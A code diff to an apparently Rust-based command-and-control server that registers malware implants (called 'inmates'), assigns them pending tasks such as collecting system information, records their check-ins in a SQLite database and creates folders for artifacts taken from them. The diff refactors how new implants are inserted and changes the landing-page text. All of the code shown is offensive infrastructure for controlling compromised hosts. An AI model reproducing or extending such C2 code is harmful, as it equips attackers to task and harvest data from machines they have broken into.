@@ -10,17 +10,18 @@ use Justice::PostRequestHeaders;
 use rusqlite::{Connection, Result, params};
 use std::time::SystemTime;
 use std::fs;
+
 mod db;
-use db::{implant_exists, update_database, get_all_inmates, create_db};
+use db::{implant_exists, update_database, get_all_inmates, create_db, insert_inmate};
 
 #[get("/")]
 fn index() -> &'static str {
-    "Hello, world!"
+    "Why are you here?"
 }
 
 #[post("/c2/<implant_id>", data = "<c2_request>")]
 fn handle_c2_request(implant_id: u32, c2_request: Json<PostRequest>) -> &'static str {
-    /* TODO */
+
     match implant_exists(implant_id) {
         Ok(inmate) => {
             let request = c2_request.into_inner();
@@ -54,29 +55,35 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
     
     match implant_exists(implant_id) {
         Ok(inmate) => {
-
             let mut new_inmate = inmate.clone();
-
             let response = CheckInResponse {
                 task: inmate.pending_instruct_type,
                 task_parameters: inmate.pending_instruct,
             };
+
             if !(response.task == c2_actions::Wait) {
                 new_inmate.request_actions.push(response.clone());
             }
-
             update_database(new_inmate);
 
             return Json(response);
         }
         Err(_) => {
-            let conn = Connection::open("prisoninmates.db").unwrap();
-            let _ = conn.execute(
-                "INSERT INTO inmates (rowid, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
-                params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "SystemInfo"]
-            );
-            println!("Implant registered id: {}", implant_id);
+            let inmate = Inmate {
+                rowid: implant_id,
+                os: "Unknown".to_string(),
+                hostname: "Unknown".to_string(),
+                ip: "TBD".to_string(),
+                pid: 1234,
+                last_checkin: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
+                pending_instruct: "".to_string(),
+                pending_instruct_type: c2_actions::SystemInfo,
+                request_actions: Vec::new(),
+                completed_actions: Vec::new(),
+            };
+            insert_inmate(inmate);
             fs::create_dir_all(format!("artifacts/{}", implant_id)).unwrap();
+
             return Json(CheckInResponse {
                 task: c2_actions::Wait,
                 task_parameters: "".to_string(),
